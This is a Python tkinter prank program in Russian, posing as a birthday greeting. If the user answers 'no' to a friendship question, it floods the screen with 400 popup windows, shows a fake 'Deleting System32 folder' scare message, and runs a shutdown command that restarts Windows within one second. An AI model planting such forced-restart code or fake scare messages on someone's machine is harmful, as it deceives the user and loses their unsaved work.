import tkinter.messagebox
from tkinter import *
import time
import os
from tkinter import scrolledtext
from tkinter import messagebox
from tkinter import ttk
from win32api import GetSystemMetrics


def yes():
    lbl.place_forget()
    btn1.place_forget()
    btn2.place_forget()
    window.geometry('940x500')
    new_lbl = Label(window, text='''С днём рождения!
    ❤️         ❤️         ❤️          ❤️           ❤️
    ❤️        ❤️          ❤️           ❤️
    ❤️         ❤️         ❤️          ❤️           ❤️''', font=("Rounds Black", 30), fg='red')
    txt = scrolledtext.ScrolledText(window, width=40, height=10)
    txt.insert(INSERT, '''С Днём рождения!
Успеха, радости, везения
Любых желаний исполнения
И миллион ночей и дней
С Днём рождения!
Любви до головокружения
И чумового настроения
И самых преданных друзей!

https://www.youtube.com/watch?v=dQw4w9WgXc
''', 'tx')
    txt.tag_config('tx', font=("Monotype Corsiva", 20))
    txt.place(x=320, y=280)
    new_lbl.place(x=0, y=0)


def no():
    res = messagebox.askquestion(':(', 'Ты уверен в своём выборе?')
    if res == 'yes':
        res2 = messagebox.askquestion(':(((', 'Точно?')
        if res2 == 'yes':
            c = 0
            c1 = 0
            f1 = 60
            f2 = 60
            w = GetSystemMetrics(0)
            h = GetSystemMetrics(1)
            for i in range(400):
                x = Toplevel(window)
                x.title("⚠️ :(")
                x.geometry(f"300x205+{str(c)}+{str(c1)}")
                x.resizable(False, False)
                ttk.Label(x, text=":(", font=('Arial', 40)).pack()
                ttk.Button(x, text=" :( ", command=x.destroy).pack(side=tkinter.BOTTOM)
                c += f1
                c1 += f2
                if c >= w or c <= 0:
                    f1 = -f1
                if c1 >= h or c1 <= 0:
                    f2 = -f2
            lbl.place_forget()
            btn1.place_forget()
            btn2.place_forget()
            Label(window, text=':(', font=('Arial', 60)).place(x=0, y=0)
            Button(window, text=":(", font=("Rounds Black", 50)).place(x=300, y=150)
            Button(window, text=":(", font=("Rounds Black", 15)).place(x=500, y=200)
            tkinter.messagebox.showinfo('😢😭😢😭😢😭😢😭', 'Удаление папки System32...')
            os.system("shutdown /r /t 1 /d u:0:5")
        else:
            yes()
    else:
        yes()


window = Tk()
window.title("СДР")
window.geometry('815x500')
lbl = Label(window, text="Мы же с тобой лучшие друзья?🥰", font=("Rounds Black", 30))
btn1 = Button(window, text="Да", font=("Rounds Black", 50), command=yes)
btn2 = Button(window, text="Ну...", font=("Rounds Black", 15), command=no)
lbl.place(x=0, y=0)
btn1.place(x=300, y=150)
btn2.place(x=500, y=200)
window.mainloop()
